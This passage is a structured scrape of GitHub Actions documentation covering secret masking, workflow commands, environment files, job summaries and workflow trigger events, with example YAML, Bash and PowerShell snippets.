        "content": "on: push\njobs:\n  generate-a-secret-output:\n    runs-on: ubuntu-latest\n    steps:\n      - id: sets-a-secret\n        name: Generate, mask, and output a secret\n        shell: pwsh\n        run: |\n          Set-Variable -Name TheSecret -Value (Get-Random)\n          Write-Output \"::add-mask::$TheSecret\"\n          \"secret-number=$TheSecret\" >> $env:GITHUB_OUTPUT\n      - name: Use that secret output (protected by a mask)\n        shell: pwsh\n        run: |\n          Write-Output \"the secret number is ${{ steps.sets-a-secret.outputs.secret-number }}\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Masking and passing a secret between jobs or workflows"
      },
      {
        "type": "paragraph",
        "text": "If you want to pass a masked secret between jobs or workflows, you should store the secret in a store and then retrieve it in the subsequent job or workflow."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Setup"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Set up a secret store to store the secret that you will generate during your workflow. For example, Vault.",
          "Generate a key for reading and writing to that secret store. Store the key as a repository secret. In the following example workflow, the secret name isSECRET_STORE_CREDENTIALS. For more information, seeUsing secrets in GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Workflow"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This workflow uses an imaginary secret store,secret-store, which has imaginary commandsstore-secretandretrieve-secret.some/secret-store@ 27b31702a0e7fc50959f5ad993c78deac1bdfc29is an imaginary action that installs thesecret-storeapplication and configures it to connect to aninstancewithcredentials."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: push\n\njobs:\n  secret-generator:\n    runs-on: ubuntu-latest\n    outputs:\n      handle: ${{ steps.generate-secret.outputs.handle }}\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}\n    - name: generate secret\n      id: generate-secret\n      shell: bash\n      run: |\n        GENERATED_SECRET=$((RANDOM))\n        echo \"::add-mask::$GENERATED_SECRET\"\n        SECRET_HANDLE=$(secret-store store-secret \"$GENERATED_SECRET\")\n        echo \"handle=$SECRET_HANDLE\" >> \"$GITHUB_OUTPUT\"\n  secret-consumer:\n    runs-on: macos-latest\n    needs: secret-generator\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}\n    - name: use secret\n      shell: bash\n      run: |\n        SECRET_HANDLE=\"${{ needs.secret-generator.outputs.handle }}\"\n        RETRIEVED_SECRET=$(secret-store retrieve-secret \"$SECRET_HANDLE\")\n        echo \"::add-mask::$RETRIEVED_SECRET\"\n        echo \"We retrieved our masked secret: $RETRIEVED_SECRET\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: push\n\njobs:\n  secret-generator:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}\n    - name: generate secret\n      shell: pwsh\n      run: |\n        Set-Variable -Name Generated_Secret -Value (Get-Random)\n        Write-Output \"::add-mask::$Generated_Secret\"\n        Set-Variable -Name Secret_Handle -Value (Store-Secret \"$Generated_Secret\")\n        \"handle=$Secret_Handle\" >> $env:GITHUB_OUTPUT\n  secret-consumer:\n    runs-on: macos-latest\n    needs: secret-generator\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}\n    - name: use secret\n      shell: pwsh\n      run: |\n        Set-Variable -Name Secret_Handle -Value \"${{ needs.secret-generator.outputs.handle }}\"\n        Set-Variable -Name Retrieved_Secret -Value (Retrieve-Secret \"$Secret_Handle\")\n        echo \"::add-mask::$Retrieved_Secret\"\n        echo \"We retrieved our masked secret: $Retrieved_Secret\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Stopping and starting workflow commands"
      },
      {
        "type": "paragraph",
        "text": "Stops processing any workflow commands. This special command allows you to log anything without accidentally running a workflow command. For example, you could stop logging to output an entire script that has comments."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::stop-commands::{endtoken}"
      },
      {
        "type": "paragraph",
        "text": "To stop the processing of workflow commands, pass a unique token tostop-commands. To resume processing workflow commands, pass the same token that you used to stop workflow commands."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Make sure the token you're using is randomly generated and unique for each run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::{endtoken}::"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Stopping and starting workflow commands"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  workflow-command-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Disable workflow commands\n        run: |\n          echo '::warning:: This is a warning message, to demonstrate that commands are being processed.'\n          stopMarker=$(uuidgen)\n          echo \"::stop-commands::$stopMarker\"\n          echo '::warning:: This will NOT be rendered as a warning, because stop-commands has been invoked.'\n          echo \"::$stopMarker::\"\n          echo '::warning:: This is a warning again, because stop-commands has been turned off.'"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  workflow-command-job:\n    runs-on: windows-latest\n    steps:\n      - name: Disable workflow commands\n        run: |\n          Write-Output '::warning:: This is a warning message, to demonstrate that commands are being processed.'\n          $stopMarker = New-Guid\n          Write-Output \"::stop-commands::$stopMarker\"\n          Write-Output '::warning:: This will NOT be rendered as a warning, because stop-commands has been invoked.'\n          Write-Output \"::$stopMarker::\"\n          Write-Output '::warning:: This is a warning again, because stop-commands has been turned off.'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Sending values to the pre and post actions"
      },
      {
        "type": "paragraph",
        "text": "You can create environment variables for sharing with your workflow'spre:orpost:actions by writing to the file located atGITHUB_STATE. For example, you can create a file with thepre:action, pass the file location to themain:action, and then use thepost:action to delete the file. Alternatively, you could create a file with themain:action, pass the file location to thepost:action, and also use thepost:action to delete the file."
      },
      {
        "type": "paragraph",
        "text": "If you have multiplepre:orpost:actions, you can only access the saved value in the action where it was written toGITHUB_STATE. For more information on thepost:action, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "TheGITHUB_STATEfile is only available within an action. The saved value is stored as an environment value with theSTATE_prefix."
      },
      {
        "type": "paragraph",
        "text": "This example uses JavaScript to write to theGITHUB_STATEfile. The resulting environment variable is namedSTATE_processIDwith the value of12345:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "import * as fs from 'fs'\nimport * as os from 'os'\n\nfs.appendFileSync(process.env.GITHUB_STATE, `processID=12345${os.EOL}`, {\n  encoding: 'utf8'\n})"
      },
      {
        "type": "paragraph",
        "text": "TheSTATE_processIDvariable is then exclusively available to the cleanup script running under themainaction. This example runs inmainand uses JavaScript to display the value assigned to theSTATE_processIDenvironment variable:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "console.log(\"The running PID from the main action is: \" + process.env.STATE_processID);"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Environment files"
      },
      {
        "type": "paragraph",
        "text": "During the execution of a workflow, the runner generates temporary files that can be used to perform certain actions. The path to these files can be accessed and edited using GitHub's default environment variables. SeeStore information in variables. You will need to use UTF-8 encoding when writing to these files to ensure proper processing of the commands. Multiple commands can be written to the same file, separated by newlines.\nTo use environment variables in a GitHub Action, you create or modify.envfiles using specific GitHub Actions commands."
      },
      {
        "type": "paragraph",
        "text": "Here's how:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Example Workflow for Environment Files\n\non: push\n\njobs:\n  set_and_use_env_vars:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Set environment variable\n        run: echo \"MY_ENV_VAR=myValue\" >> $GITHUB_ENV\n\n      - name: Use environment variable\n        run: |\n          echo \"The value of MY_ENV_VAR is $MY_ENV_VAR\""
      },
      {
        "type": "paragraph",
        "text": "Another example would be to use it to store metadata like build timestamps, commit SHAs, or artifact names:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Store build timestamp\n    run: echo \"BUILD_TIME=$(date +'%T')\" >> $GITHUB_ENV\n\n  - name: Deploy using stored timestamp\n    run: echo \"Deploying at $BUILD_TIME\""
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "PowerShell versions 5.1 and below (shell: powershell) do not use UTF-8 by default, so you must specify the UTF-8 encoding. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  legacy-powershell-example:\n    runs-on: windows-latest\n    steps:\n      - shell: powershell\n        run: |\n          \"mypath\" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append"
      },
      {
        "type": "paragraph",
        "text": "PowerShell Core versions 6 and higher (shell: pwsh) use UTF-8 by default. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  powershell-core-example:\n    runs-on: windows-latest\n    steps:\n      - shell: pwsh\n        run: |\n          \"mypath\" >> $env:GITHUB_PATH"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting an environment variable"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To avoid issues, it's good practice to treat environment variables as case sensitive, irrespective of the behavior of the operating system and shell you are using."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"{environment_variable_name}={value}\" >> \"$GITHUB_ENV\""
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using PowerShell version 6 and higher:PowerShell\"{environment_variable_name}={value}\" >> $env:GITHUB_ENV\"{environment_variable_name}={value}\">>$env:GITHUB_ENV",
          "Using PowerShell version 5.1 and below:PowerShell\"{environment_variable_name}={value}\" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append\"{environment_variable_name}={value}\"|Out-File-FilePath$env:GITHUB_ENV-Encodingutf8-Append"
        ]
      },
      {
        "type": "paragraph",
        "text": "You can make an environment variable available to any subsequent steps in a workflow job by defining or updating the environment variable and writing this to theGITHUB_ENVenvironment file. The step that creates or updates the environment variable does not have access to the new value, but all subsequent steps in a job will have access."
      },
      {
        "type": "paragraph",
        "text": "You can't overwrite the value of the default environment variables namedGITHUB_*andRUNNER_*. Currently you can overwrite the value of theCIvariable. However, it's not guaranteed that this will always be possible. For more information about the default environment variables, seeStore information in variables."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Due to security restrictions,GITHUB_ENVcannot be used to set theNODE_OPTIONSenvironment variable."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example of writing an environment variable toGITHUB_ENV"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Set the value\n    id: step_one\n    run: |\n      echo \"action_state=yellow\" >> \"$GITHUB_ENV\"\n  - name: Use the value\n    id: step_two\n    run: |\n      printf '%s\\n' \"$action_state\" # This will output 'yellow'"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Set the value\n    id: step_one\n    run: |\n      \"action_state=yellow\" >> $env:GITHUB_ENV\n  - name: Use the value\n    id: step_two\n    run: |\n      Write-Output \"$env:action_state\" # This will output 'yellow'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Multiline strings"
      },
      {
        "type": "paragraph",
        "text": "For multiline strings, you may use a delimiter with the following syntax."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{name}<<{delimiter}\n{value}\n{delimiter}"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Make sure the delimiter you're using won't occur on a line of its own within the value. If the value is completely arbitrary then you shouldn't use this format. Write the value to a file instead."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example of a multiline string"
      },
      {
        "type": "paragraph",
        "text": "This example usesEOFas the delimiter, and sets theJSON_RESPONSEenvironment variable to the value of thecurlresponse."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Set the value in bash\n    id: step_one\n    run: |\n      {\n        echo 'JSON_RESPONSE<<EOF'\n        curl https://example.com\n        echo EOF\n      } >> \"$GITHUB_ENV\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Set the value in pwsh\n    id: step_one\n    run: |\n      $EOF = (New-Guid).Guid\n      \"JSON_RESPONSE<<$EOF\" >> $env:GITHUB_ENV\n      (Invoke-WebRequest -Uri \"https://example.com\").Content >> $env:GITHUB_ENV\n      \"$EOF\" >> $env:GITHUB_ENV\n    shell: pwsh"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting an output parameter"
      },
      {
        "type": "paragraph",
        "text": "Sets a step's output parameter. Note that the step will need anidto be defined to later retrieve the output value. You can set multi-line output values with the same technique used in theMultiline stringssection to define multi-line environment variables."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"{name}={value}\" >> \"$GITHUB_OUTPUT\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "\"{name}=value\" >> $env:GITHUB_OUTPUT"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example of setting an output parameter"
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to set theSELECTED_COLORoutput parameter and later retrieve it:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Set color\n        id: color-selector\n        run: echo \"SELECTED_COLOR=green\" >> \"$GITHUB_OUTPUT\"\n      - name: Get color\n        env:\n          SELECTED_COLOR: ${{ steps.color-selector.outputs.SELECTED_COLOR }}\n        run: echo \"The selected color is $SELECTED_COLOR\""
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to set theSELECTED_COLORoutput parameter and later retrieve it:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Set color\n        id: color-selector\n        run: |\n            \"SELECTED_COLOR=green\" >> $env:GITHUB_OUTPUT\n      - name: Get color\n        env:\n          SELECTED_COLOR: ${{ steps.color-selector.outputs.SELECTED_COLOR }}\n        run: Write-Output \"The selected color is $env:SELECTED_COLOR\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a job summary"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"{markdown content}\" >> $GITHUB_STEP_SUMMARY"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "\"{markdown content}\" >> $env:GITHUB_STEP_SUMMARY"
      },
      {
        "type": "paragraph",
        "text": "You can set some custom Markdown for each job so that it will be displayed on the summary page of a workflow run. You can use job summaries to display and group unique content, such as test result summaries, so that someone viewing the result of a workflow run doesn't need to go into the logs to see important information related to the run, such as failures."
      },
      {
        "type": "paragraph",
        "text": "Job summaries supportGitHub flavored Markdown, and you can add your Markdown content for a step to theGITHUB_STEP_SUMMARYenvironment file.GITHUB_STEP_SUMMARYis unique for each step in a job. For more information about the per-step file thatGITHUB_STEP_SUMMARYreferences, seeEnvironment files."
      },
      {
        "type": "paragraph",
        "text": "When a job finishes, the summaries for all steps in a job are grouped together into a single job summary and are shown on the workflow run summary page. If multiple jobs generate summaries, the job summaries are ordered by job completion time."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example of adding a job summary"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"### Hello world! :rocket:\" >> $GITHUB_STEP_SUMMARY"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "\"### Hello world! :rocket:\" >> $env:GITHUB_STEP_SUMMARY"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Multiline Markdown content"
      },
      {
        "type": "paragraph",
        "text": "For multiline Markdown content, you can use>>to continuously append content for the current step. With every append operation, a newline character is automatically added."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example of multiline Markdown content"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Generate list using Markdown\n  run: |\n    echo \"This is the lead in sentence for the list\" >> $GITHUB_STEP_SUMMARY\n    echo \"\" >> $GITHUB_STEP_SUMMARY # this is a blank line\n    echo \"- Lets add a bullet point\" >> $GITHUB_STEP_SUMMARY\n    echo \"- Lets add a second bullet point\" >> $GITHUB_STEP_SUMMARY\n    echo \"- How about a third one?\" >> $GITHUB_STEP_SUMMARY"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Generate list using Markdown\n  run: |\n    \"This is the lead in sentence for the list\" >> $env:GITHUB_STEP_SUMMARY\n    \"\" >> $env:GITHUB_STEP_SUMMARY # this is a blank line\n    \"- Lets add a bullet point\" >> $env:GITHUB_STEP_SUMMARY\n    \"- Lets add a second bullet point\" >> $env:GITHUB_STEP_SUMMARY\n    \"- How about a third one?\" >> $env:GITHUB_STEP_SUMMARY"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Overwriting job summaries"
      },
      {
        "type": "paragraph",
        "text": "To clear all content for the current step, you can use>to overwrite any previously added content in Bash, or remove-Appendin PowerShell"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example of overwriting job summaries"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Overwrite Markdown\n  run: |\n    echo \"Adding some Markdown content\" >> $GITHUB_STEP_SUMMARY\n    echo \"There was an error, we need to clear the previous Markdown with some new content.\" > $GITHUB_STEP_SUMMARY"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Overwrite Markdown\n  run: |\n    \"Adding some Markdown content\" >> $env:GITHUB_STEP_SUMMARY\n    \"There was an error, we need to clear the previous Markdown with some new content.\" >> $env:GITHUB_STEP_SUMMARY"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Removing job summaries"
      },
      {
        "type": "paragraph",
        "text": "To completely remove a summary for the current step, the file thatGITHUB_STEP_SUMMARYreferences can be deleted."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example of removing job summaries"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Delete all summary content\n  run: |\n    echo \"Adding Markdown content that we want to remove before the step ends\" >> $GITHUB_STEP_SUMMARY\n    rm $GITHUB_STEP_SUMMARY"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Delete all summary content\n  run: |\n    \"Adding Markdown content that we want to remove before the step ends\" >> $env:GITHUB_STEP_SUMMARY\n    Remove-Item $env:GITHUB_STEP_SUMMARY"
      },
      {
        "type": "paragraph",
        "text": "After a step has completed, job summaries are uploaded and subsequent steps cannot modify previously uploaded Markdown content. Summaries automatically mask any secrets that might have been added accidentally. If a job summary contains sensitive information that must be deleted, you can delete the entire workflow run to remove all its job summaries. For more information seeDeleting a workflow run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Step isolation and limits"
      },
      {
        "type": "paragraph",
        "text": "Job summaries are isolated between steps and each step is restricted to a maximum size of 1MiB. Isolation is enforced between steps so that potentially malformed Markdown from a single step cannot break Markdown rendering for subsequent steps. If more than 1MiB of content is added for a step, then the upload for the step will fail and an error annotation will be created. Upload failures for job summaries do not affect the overall status of a step or a job. A maximum of 20 job summaries from steps are displayed per job."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a system path"
      },
      {
        "type": "paragraph",
        "text": "Prepends a directory to the systemPATHvariable and automatically makes it available to all subsequent actions in the current job; the currently running action cannot access the updated path variable. To see the currently defined paths for your job, you can useecho \"$PATH\"in a step or an action."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example of adding a system path"
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to add the user$HOME/.local/bindirectory toPATH:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"$HOME/.local/bin\" >> \"$GITHUB_PATH\""
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to add the user$env:HOMEPATH/.local/bindirectory toPATH:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "\"$env:HOMEPATH/.local/bin\" | Out-File -FilePath \"$env:GITHUB_PATH\" -Append"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About events that trigger workflows"
      },
      {
        "type": "paragraph",
        "text": "Workflow triggers are events that cause a workflow to run. For more information about how to use workflow triggers, seeTriggering a workflow."
      },
      {
        "type": "paragraph",
        "text": "Some events have multiple activity types. For these events, you can specify which activity types will trigger a workflow run. For more information about what each activity type means, seeWebhook events and payloads."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Not all webhook events trigger workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "branch_protection_rule"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when branch protection rules in the workflow repository are changed. For more information about branch protection rules, seeAbout protected branches. For information about the branch protection rule APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for branches and their settings."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a branch protection rule has beencreatedordeleted:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  branch_protection_rule:\n    types: [created, deleted]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "check_run"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when activity related to a check run occurs. A check run is an individual test that is part of a check suite. For information, seeUsing the REST API to interact with checks. For information about the check run APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for check runs."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a check run has beenrerequestedorcompleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  check_run:\n    types: [rerequested, completed]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "check_suite"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. Although only thecompletedactivity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To prevent recursive workflows, this event does not trigger workflows if the check suite was created by GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when check suite activity occurs. A check suite is a collection of the check runs created for a specific commit. Check suites summarize the status and conclusion of the check runs that are in the suite. For information, seeUsing the REST API to interact with checks. For information about the check suite APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for check suites."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a check suite has beencompleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  check_suite:\n    types: [completed]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "create"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "An event will not be created when you create more than three tags at once."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when someone creates a Git reference (Git branch or tag) in the workflow's repository. For information about the APIs to create a Git reference, seeMutationsin the GraphQL API documentation orREST API endpoints for Git references."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thecreateevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  create"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "delete"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "An event will not be created when you delete more than three tags at once."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when someone deletes a Git reference (Git branch or tag) in the workflow's repository. For information about the APIs to delete a Git reference, seeMutationsin the GraphQL API documentation orREST API endpoints for Git references."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thedeleteevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  delete"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "deployment"
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when someone creates a deployment in the workflow's repository. Deployments created with a commit SHA may not have a Git ref. For information about the APIs to create a deployment, seeMutationsin the GraphQL API documentation orREST API endpoints for repositories."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thedeploymentevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  deployment"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "deployment_status"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When a deployment status's state is set toinactive, a workflow run will not be triggered."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a third party provides a deployment status. Deployments created with a commit SHA may not have a Git ref. For information about the APIs to create a deployment status, seeMutationsin the GraphQL API documentation orREST API endpoints for deployments."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thedeployment_statusevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  deployment_status"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "discussion"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Webhook events for GitHub Discussions are currently in public preview and subject to change."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a discussion in the workflow's repository is created or modified. For activity related to comments on a discussion, use thediscussion_commentevent. For more information about discussions, seeAbout discussions. For information about the GraphQL API, seeObjects."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a discussion has beencreated,edited, oranswered."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  discussion:\n    types: [created, edited, answered]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "discussion_comment"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Webhook events for GitHub Discussions are currently in public preview and subject to change."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a comment on a discussion in the workflow's repository is created or modified. For activity related to a discussion as opposed to comments on the discussion, use thediscussionevent. For more information about discussions, seeAbout discussions. For information about the GraphQL API, seeObjects."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a discussion comment has beencreatedordeleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  discussion_comment:\n    types: [created, deleted]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "fork"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when someone forks a repository. For information about the REST API, seeREST API endpoints for forks."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when theforkevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  fork"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "gollum"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when someone creates or updates a Wiki page. For more information, seeAbout wikis."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thegollumevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  gollum"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "issue_comment"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
